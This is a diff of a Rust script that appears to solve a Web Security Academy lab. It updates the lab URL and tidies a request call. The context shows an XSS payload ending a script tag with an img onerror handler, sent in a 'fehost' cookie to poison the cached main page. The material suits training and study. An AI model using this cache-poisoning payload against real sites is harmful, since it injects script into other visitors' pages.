@@ -19,7 +19,7 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0a3c00d20466f214805bdc30003800f0.web-security-academy.net";
+const LAB_URL: &str = "https://0a4400f304c3270181dd0c4700ba0012.web-security-academy.net";
 
 fn main() {
     let payload = r###" "}</script><img src=1 onerror=alert(1)> "###;
@@ -41,7 +41,7 @@ fn main() {
 fn poison_main_page(payload: &str) -> Response {
     let client = build_web_client();
     client
-        .get(format!("{LAB_URL}"))
+        .get(LAB_URL)
         .header("Cookie", format!("fehost={payload}"))
         .send()
         .expect(&format!(
